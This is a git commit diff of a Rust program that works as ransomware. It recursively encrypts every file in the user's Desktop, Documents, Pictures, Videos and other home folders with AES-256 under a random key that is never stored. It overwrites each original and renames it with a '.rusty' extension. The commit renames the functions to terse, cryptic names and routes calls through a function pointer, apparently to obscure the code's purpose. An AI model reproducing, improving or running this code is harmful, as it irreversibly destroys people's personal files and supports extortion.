92cffb229040f6e609e6e180e3539c29b2f626cc
Bento <104942265+Brentlyw@users.noreply.github.com>
2024-07-31 22:22:35 -0400

    Add files via upload

--- main.rs
+++ main.rs
@@ -11,28 +11,43 @@ use std::convert::TryInto;
 
 type EncCbc = Cbc<Aes256, Pkcs7>;
 
-fn gen_key_iv() -> ([u8; 32], [u8; 16]) {
+fn geniv() -> ([u8; 32], [u8; 16]) {
     let rng = thread_rng();
     let key: [u8; 32] = rng.sample_iter(&Standard).take(32).collect::<Vec<u8>>().try_into().unwrap();
     let iv: [u8; 16] = thread_rng().sample_iter(&Standard).take(16).collect::<Vec<u8>>().try_into().unwrap();
     (key, iv)
 }
 
-fn enc_file(path: &PathBuf, key: &[u8; 32], iv: &[u8; 16]) -> std::io::Result<()> {
-    let mut file_content = Vec::new();
+fn rfc(path: &PathBuf) -> std::io::Result<Vec<u8>> {
     let mut file = File::open(&path)?;
-    file.read_to_end(&mut file_content)?;
-    let cipher = EncCbc::new_from_slices(key, iv).unwrap();
-    let ciphertext = cipher.encrypt_vec(&file_content);
+    let mut content = Vec::new();
+    file.read_to_end(&mut content)?;
+    Ok(content)
+}
+
+fn wec(path: &PathBuf, content: &[u8]) -> std::io::Result<()> {
     let mut file = File::create(&path)?;
-    file.write_all(&ciphertext)?;
+    file.write_all(content)?;
+    Ok(())
+}
+
+fn rnme(path: &PathBuf) -> std::io::Result<()> {
     let new_path = path.with_extension("rusty");
     fs::rename(path, new_path)?;
     Ok(())
 }
 
+fn encrio(path: &PathBuf, key: &[u8; 32], iv: &[u8; 16]) -> std::io::Result<()> {
+    let content = rfc(path)?;
+    let cipher = EncCbc::new_from_slices(key, iv).unwrap();
+    let encrypted_content = cipher.encrypt_vec(&content);
+    wec(path, &encrypted_content)?;
+    rnme(path)?;
+    Ok(())
+}
+
 fn main() -> std::io::Result<()> {
-    let home_d = dirs::home_dir().expect("where home?");
+    let home_d = dirs::home_dir().expect("Nohome?");
     let dirs_to_enc = vec![
         home_d.join("Desktop"),
         home_d.join("Documents"),
@@ -40,11 +55,12 @@ fn main() -> std::io::Result<()> {
         home_d.join("Pictures"),
         home_d.join("Videos"),
     ];
-    let (key, iv) = gen_key_iv();
+    let (key, iv) = geniv();
+    let enc_fn = encrio as fn(&PathBuf, &[u8; 32], &[u8; 16]) -> std::io::Result<()>;
     for dir in dirs_to_enc {
         for entry in WalkDir::new(&dir).into_iter().filter_map(Result::ok).filter(|e| e.file_type().is_file()) {
             let path = entry.path().to_path_buf();
-            if let Err(_) = enc_file(&path, &key, &iv) {}
+            if let Err(_) = enc_fn(&path, &key, &iv) {}
         }
     }
     Ok(())
